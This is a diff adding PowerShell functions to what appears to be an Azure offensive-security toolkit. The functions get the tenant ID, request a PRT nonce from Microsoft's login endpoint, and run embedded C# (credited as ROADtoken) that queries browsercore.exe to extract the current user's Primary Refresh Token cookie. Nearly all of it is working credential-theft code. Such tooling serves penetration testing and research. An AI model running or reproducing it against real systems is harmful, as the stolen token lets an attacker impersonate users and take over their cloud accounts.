@@ -3725,3 +3725,186 @@ Function Set-ARTAzVMExtension {
         $ErrorActionPreference = $EA
     }   
 }
+
+
+Function Get-ARTTenantID {
+    <#
+    .SYNOPSIS
+        Retrieves Current user's Tenant ID
+
+    .DESCRIPTION
+        Retrieves Current user's Tenant ID
+
+    .EXAMPLE
+        PS C:\> Get-ARTTenantID
+    #>
+    [CmdletBinding()]
+    Param(
+    )
+
+    $TenantId = $null
+
+    try {
+        $TenantId = (Get-AzContext).Tenant.Id
+        Write-Verbose "Tenant ID acquired via Az module: $TenantId"
+
+    } catch {
+        try {
+            $TenantId = (Get-AzureADCurrentSessionInfo).Tenant.Id
+            Write-Verbose "Tenant ID acquired via AzureAD module: $TenantId"
+        }
+        catch{
+            try {
+                $TenantId = (dsregcmd /status | sls -Pattern 'TenantId\s+:\s+(.+)').Matches.Groups[1].Value
+                Write-Verbose "Tenant ID acquired via dsregcmd parsing: $TenantId"
+            }
+            catch {
+                Write-Verbose "Could not acquire Tenant ID!"
+            }
+        }
+    }
+
+    Return $TenantId
+}
+
+
+Function Get-ARTPRTNonce {
+    <#
+    .SYNOPSIS
+        Retrieves Current user's PRT (Primary Refresh Token) nonce value
+
+    .DESCRIPTION
+        Retrieves Current user's PRT (Primary Refresh Token) nonce value
+
+    .EXAMPLE
+        PS C:\> Get-ARTPRTNonce
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$False)]
+        [String]
+        $TenantId
+    )
+
+    if($TenantId -eq $null -or $TenantId.Length -eq 0) {
+        $TenantId = Get-ARTTenantID
+    }
+
+    Write-Verbose "Using Tenant ID: $TenantId"
+
+    if($TenantId -eq $null -or $TenantId.Length -eq 0) {
+        Write-Error "Could not obtain Tenant ID! Specify one in -TenantId parameter"
+        Return
+    }
+
+    $URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"
+    $Params = @{
+        "URI"    = $URL
+        "Method" = "POST"
+    }
+
+    $Body = @{
+        "grant_type" = "srv_challenge"
+    }
+
+    $Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
+    Return $Result.Nonce
+}
+
+
+Function Get-ARTPRTToken {
+    <#
+    .SYNOPSIS
+        Retrieves Current user's PRT via Dirk-Jan Mollema's ROADtoken
+
+    .DESCRIPTION
+        Retrieves Current user's PRT (Primary Refresh Token) value using Dirk-Jan Mollema's ROADtoken
+
+    .EXAMPLE
+        PS C:\> Get-ARTPRTToken
+    #>
+
+    $code = @'
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace ROADToken
+{
+    public class Program12
+    {
+        public static string GetToken(string nonce)
+        {
+            string[] filelocs = {
+                @"C:\Program Files\Windows Security\BrowserCore\browsercore.exe",
+                @"C:\Windows\BrowserCore\browsercore.exe"
+            };
+
+            string targetFile = null;
+            foreach (string file in filelocs)
+            {
+                if (File.Exists(file))
+                {
+                    targetFile = file;
+                    break;
+                }
+            }
+
+            if (targetFile == null)
+            {
+                Console.WriteLine("[!] Could not find browsercore.exe in one of the predefined locations");
+                return "";
+            }
+
+            using (Process myProcess = new Process())
+            {
+                myProcess.StartInfo.FileName = targetFile;
+                myProcess.StartInfo.UseShellExecute = false;
+                myProcess.StartInfo.RedirectStandardInput = true;
+                myProcess.StartInfo.RedirectStandardOutput = true;
+                string stuff;
+            
+                stuff = "{" +
+                "\"method\":\"GetCookies\"," +
+                "\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=" + nonce + "\"," +
+                "\"sender\":\"https://login.microsoftonline.com\"" +
+                "}";
+                
+                myProcess.Start();
+
+                StreamWriter myStreamWriter = myProcess.StandardInput;
+                var myInt = stuff.Length;
+                byte[] bytes = BitConverter.GetBytes(myInt);
+                myStreamWriter.BaseStream.Write(bytes, 0 , 4);
+                myStreamWriter.Write(stuff);
+                myStreamWriter.Close();
+
+                string lines = "";
+                while (!myProcess.StandardOutput.EndOfStream)
+                {
+                    string line = myProcess.StandardOutput.ReadLine();
+                    lines += line;
+                }
+                
+                var pos = lines.IndexOf("{");
+                return lines.Substring(pos);
+            }
+        }
+    }
+}
+'@
+
+    Add-Type -TypeDefinition $code -Language CSharp 
+
+    $nonce = Get-ARTPRTNonce
+    $out = [ROADToken.Program12]::GetToken($nonce)
+
+    try {
+        Return ($out | ConvertFrom-Json).response.data
+    }
+    catch {}
+}
